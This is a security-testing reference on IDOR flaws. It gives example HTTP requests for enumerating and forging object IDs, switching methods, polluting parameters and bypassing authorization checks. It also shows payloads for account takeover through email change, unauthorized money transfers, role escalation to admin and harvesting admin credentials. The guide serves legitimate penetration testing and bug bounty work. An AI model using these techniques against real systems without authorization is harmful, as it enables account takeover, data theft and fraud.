# IDOR Patterns — Deep Reference

## Table of Contents
1. IDOR Setup: Two-Account Testing
2. Direct IDOR (Numeric IDs)
3. UUID and Non-Enumerable ID Attacks
4. Encoded and Hashed References
5. HTTP Method Switching
6. Parameter Pollution
7. Indirect IDOR (Reference Chaining)
8. IDOR in Uncommon Locations
9. State-Changing IDOR (Write Access)
10. Advanced IDOR Bypass Techniques
11. Horizontal-to-Vertical Escalation Chain
12. IDOR Quick Checklist

---

## 1. IDOR Setup: Two-Account Testing

Always test IDOR with two distinct accounts to avoid false positives.

**Setup:**
- Account A: `attacker@test.com` — the account you control and use to harvest IDs
- Account B: `victim@test.com` — the account whose data you attempt to access

**Browser setup:**
- Account A: Primary browser (Chrome)
- Account B: Secondary browser (Firefox) or Incognito
- Or: Burp Suite with two browser sessions, toggling between cookies

**The test:**
1. Logged in as Account A, find a resource ID (e.g., `/api/documents/1234`)
2. Copy the exact request
3. Switch to Account B's session
4. Make the same request — do you get Account A's document?

If yes → IDOR confirmed. Now determine what data is in the response (T1-T4 tier).

---

## 2. Direct IDOR (Numeric IDs)

The simplest form: a numeric ID in the URL or request body controls which record is returned.

### URL Path IDOR
```
# Your resource:
GET /api/orders/1042

# Change to other users' orders:
GET /api/orders/1041
GET /api/orders/1043
GET /api/orders/1000
GET /api/orders/1
```

### Query Parameter IDOR
```
GET /profile?user_id=8472
GET /invoices?account=8472
GET /messages?thread_id=8472
GET /documents?owner=8472
```

### Request Body IDOR
```json
POST /api/getData
{"user_id": 8472}

POST /api/transfer
{"from_account": 8472, "to_account": 9999, "amount": 100}
```

### Predictability Testing
If IDs appear sequential, you can infer valid IDs nearby your own. If your ID is 84720:
- Try 1 through 100 (early users, often admins)
- Try your ID ± 50
- Try round numbers: 80000, 85000, 90000

---

## 3. UUID and Non-Enumerable ID Attacks

UUIDs (e.g., `550e8400-e29b-41d4-a716-446655440000`) look non-guessable, but they're often predictable or obtainable.

### UUID Leakage
UUIDs frequently appear in:
- Email links (password reset, email verification, invite links)
- Referrer headers when a UUID is in the URL
- API responses for related objects
- Error messages
- JavaScript source files (`var userId = "550e8400..."`)
- Browser history / autocomplete
- Log files exposed via debug endpoints

**Test:** Does the email confirmation link contain the user's UUID? Collect several to confirm uniqueness, then test cross-account access.

### UUID Version Analysis
- UUID v1: time-based and partially predictable (contains MAC address and timestamp)
- UUID v4: random — not predictable but still obtainable via leakage
- UUID v5: deterministic (namespace + name) — if you know the namespace, you can generate valid UUIDs

### Slug-Based IDOR
Some apps use slugs instead of IDs:
```
/api/profiles/john-doe-sf-ca
/api/companies/acme-corp
```
Enumerate: common names, company names from LinkedIn/Crunchbase, email prefix + city pattern.

---

## 4. Encoded and Hashed References

Sometimes IDs are obfuscated with base64, custom encoding, or weak hashes.

### Base64
```
# Encoded ID in request:
user_token=dXNlcjoxMjM0NQ==

# Decode:
echo "dXNlcjoxMjM0NQ==" | base64 -d
# Result: user:12345

# Modify:
echo "user:12346" | base64
# Result: dXNlcjoxMjM0Ng==

# Send modified:
user_token=dXNlcjoxMjM0Ng==
```

Common base64-encoded patterns:
- `user:ID`
- `{"id":ID,"type":"user"}`
- `ID:timestamp`
- Just the raw ID

### JWT-Based References
If an ID is embedded in a JWT (not as an auth token, but as a reference):
- Decode the JWT payload
- Modify the embedded ID
- See if the signature is validated or if it can be tampered

### MD5/SHA1 of ID
Some apps hash IDs to create "unguessable" URLs:
```
/documents/098f6bcd4621d373cade4e832627b4f6  # MD5("test")
```
Test: is the hash of a small integer (MD5(1), MD5(2), etc.)? Brute-force small integers.

```bash
for i in $(seq 1 10000); do echo -n "$i" | md5sum | cut -d' ' -f1; done > md5_hashes.txt
# Then compare against known hashes
```

---

## 5. HTTP Method Switching

Some authorization checks are only implemented for specific HTTP methods. Switching methods can bypass the check.

### GET → POST → PUT → DELETE
```
# Endpoint works with GET but you don't have write access:
GET /api/users/1234  → 200 OK (read someone else's profile)

# Try modifying it:
PUT /api/users/1234
{"email": "attacker@evil.com"}

# Or delete it:
DELETE /api/users/1234
```

### HEAD Method
`HEAD` returns headers without body — sometimes auth isn't checked:
```
HEAD /api/admin/users/1234
# If 200 vs 403, the endpoint exists and auth is checked inconsistently
```

### Override Headers
Some frameworks support method overriding via headers:
```
POST /api/users/1234
X-HTTP-Method-Override: DELETE

POST /api/users/1234
X-Method-Override: PUT
_method=DELETE  (in request body)
```

---

## 6. Parameter Pollution

Add multiple values for the same parameter — different parsers may pick different values.

### Duplicate Parameters
```
# Your legitimate access:
GET /api/messages?user_id=9999&user_id=1234

# Some frameworks take the first value (9999 - your ID for auth check)
# Others take the last value (1234 - the target's ID for data retrieval)
# Result: auth check passes for you, data returned for victim
```

### Array Parameters
```
GET /api/documents?id[]=1234&id[]=5678
GET /api/documents?ids=1234,5678
POST /api/getData
{"ids": [1234, 5678, 9999]}
```
Does the API return all requested IDs without checking if each belongs to you?

### JSON Parameter Smuggling
```json
# Standard request:
{"document_id": "your-uuid"}

# Polluted request:
{"document_id": "your-uuid", "document_id": "target-uuid"}
{"document_id": ["your-uuid", "target-uuid"]}
```

---

## 7. Indirect IDOR (Reference Chaining)

Sometimes you can't directly reference another user's resource, but you can reference something that *refers to* their resource.

### Via Related Objects
```
# You can't GET /orders/1234 (belongs to another user)
# But you CAN GET /shipments/9876 which references order 1234
# The shipment response includes order details including personal data
```

**Map the object graph:** When you find an IDOR, explore all related objects. An order may reference a user, address, payment method, and invoice — each of which may contain sensitive data.

### Via Actions
```
# Can't read another user's private message directly
# But can you add the message to a shared thread?
# Or forward it? Or quote it in a reply?
```

### Via Export/Report Features
```
# Can't access /api/users/1234 directly
# But can you generate a report that includes that user?
GET /api/reports/generate?user_ids=1234
POST /api/export {"include_users": [1234]}
```

---

## 8. IDOR in Uncommon Locations

Don't just check URLs — IDs appear everywhere.

### HTTP Headers
```
X-User-ID: 8472
X-Account: 8472
X-Resource-ID: 8472
Idempotency-Key: order-8472  (sometimes used as a reference)
```

### Cookies
```
user_id=8472
account_ref=8472
resource_id=8472
```
Modifying cookie values is often forgotten in security reviews.

### WebSocket Messages
```json
{"action": "subscribe", "channel": "user_updates", "user_id": 8472}
{"type": "get_data", "resource_id": 8472}
```

### GraphQL Variables
```graphql
query {
  user(id: "8472") {
    email
    ssn
    dateOfBirth
  }
}
```

### File Download Endpoints
```
GET /download?file_id=8472
GET /export?report_id=8472
GET /attachments/8472
```
File downloads are frequently IDOR-vulnerable because they're treated as "just serving files."

---

## 9. State-Changing IDOR (Write Access)

Read IDOR exposes data. Write IDOR lets you modify or delete another user's resources — always higher severity.

### Profile Modification
```
PUT /api/profile/1234
{"email": "attacker@evil.com"}
# Result: can take over another account via password reset to your email
```

### Password/Email Change
```
POST /api/change-email
{"user_id": 1234, "new_email": "attacker@evil.com"}
```
This is effectively an account takeover — Critical severity.

### Resource Deletion
```
DELETE /api/posts/1234  # delete another user's content
DELETE /api/documents/1234
```

### Financial Operations
```
POST /api/transfer
{"from_account": 1234, "to_account": 9999, "amount": 1000}
# Can you initiate transfers from someone else's account?
```

### Privilege Escalation via IDOR
```
PUT /api/users/1234
{"role": "admin"}
# Can you modify another user's role, including your own?

POST /api/users/9999/permissions  # 9999 = your own account
{"permissions": ["admin", "all"]}
```

---

## 10. Advanced IDOR Bypass Techniques

These bypass access control checks that correctly implement the main logic but have gaps in edge cases.

### Array Wrapping
Some ORMs/frameworks iterate over arrays, executing queries without re-running the authorization check on each element:
```json
{"id": 19}         →  normal request, auth checked
{"id": [19]}       →  may bypass auth expecting a scalar
{"id": [19, 20]}   →  may return both records, only first auth-checked
{"id": [1,2,3,...,100]}  →  batch exfiltration in one request
```

### Wildcard / Glob Substitution
Replace a specific ID with wildcards — some backends pattern-match these:
```
GET /api/users/*
GET /api/users/%
GET /api/users/_
GET /api/users/null
GET /api/users/undefined
GET /api/users/0
GET /api/users/-1
```
A wildcard that returns all records = mass exposure. Null/undefined may trigger a code path that skips authorization.

### File Extension Appending
The routing framework strips extensions before matching routes, but the authorization middleware may fire on the un-stripped path:
```
/user_data/2341       →  403
/user_data/2341.json  →  200
/user_data/2341.xml   →  200
/user_data/2341.csv   →  200
/user_data/2341%2ejson →  200  (encoded dot)
```

### Content-Type Switching
Access control middleware may only fire for certain content types:
```
Content-Type: application/json                    →  403
Content-Type: application/xml                     →  200
Content-Type: text/plain                          →  200
Content-Type: application/x-www-form-urlencoded  →  200
Content-Type: multipart/form-data                 →  200
```

### Add Missing ID Parameters
Endpoints that don't normally accept an ID may silently pass one through to the ORM:
```
GET /api/MyPictureList                           →  your photos
GET /api/MyPictureList?user_id=victim_id        →  their photos?
GET /api/notifications                           →  your notifications
GET /api/notifications?account_id=victim_id     →  their notifications?
```

### Parameter Name Substitution
If `user_id` is protected, the backend may also accept alternate names unchecked:
```
user_id → account_id, uid, userId, u_id, member_id, profile_id,
           author_id, owner_id, created_by, customer_id, contact_id
```
Each name may take a different code path, some of which lack the authorization check.

---

## 11. Horizontal-to-Vertical Escalation Chain

The highest-impact IDOR pattern: use a read IDOR to extract privileged credentials, then use those credentials for full account takeover.

**Step 1:** Find a read IDOR on a user profile or settings endpoint
```
GET /api/users/1/settings  →  your settings (account 1)
GET /api/users/2/settings  →  admin account? (account 2)
```

**Step 2:** The admin account's response contains:
```json
{
  "id": 2,
  "email": "admin@company.com",
  "api_key": "sk_live_xxxx",         ← privileged API key
  "backup_codes": ["123456", ...],    ← 2FA backup codes
  "session_token": "eyJ...",          ← active session
  "password_hash": "$2b$12$..."       ← crackable offline
}
```

**Step 3:** Use the extracted credential to authenticate as admin → Critical

**Severity formula:**
```
IDOR (read-only, T4 data) = Medium
+ Access admin account credentials = Critical
+ No 2FA on admin account = Critical (+ account takeover evidence)
```

Always look at the *highest-privilege user* accessible via IDOR, not just random users. Admin accounts are created early (ID 1-10) — always try the first few IDs.

---

## 12. IDOR Quick Checklist

Run through this on every target:

```
[ ] Profile/account endpoints with numeric or UUID IDs
[ ] Order/invoice/transaction IDs
[ ] Message/notification IDs
[ ] Document/file/attachment IDs
[ ] Password reset / email verification tokens (are they IDORable?)
[ ] Admin-prefixed endpoints: /api/admin/, /api/internal/
[ ] Export/download endpoints
[ ] WebSocket message IDs
[ ] HTTP method switching on discovered IDORs
[ ] Parameter pollution on ID fields
[ ] IDs embedded in JWTs or base64 blobs
[ ] Related object references (orders → users → addresses)
[ ] Write IDOR: can you modify/delete another user's resources?
[ ] Self-reference IDOR: modify your own object's role/permission fields
```
